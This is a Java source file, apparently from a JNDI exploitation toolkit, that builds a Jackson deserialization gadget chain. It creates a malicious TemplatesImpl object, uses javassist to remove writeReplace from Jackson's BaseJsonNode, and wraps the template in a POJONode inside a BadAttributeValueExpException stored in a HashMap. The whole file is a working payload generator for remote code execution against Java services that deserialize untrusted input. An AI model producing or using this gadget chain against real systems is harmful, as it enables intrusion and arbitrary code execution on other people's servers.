package com.qi4l.jndi.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.Serializer;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;

import static com.qi4l.jndi.Starter.cmdLine;

public class Jackson implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }

        ClassPool pool = ClassPool.getDefault();
        //pool.insertClassPath(new ClassClassPath(Class.forName("com.fasterxml.jackson.databind.node.BaseJsonNode")));
        CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();

        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
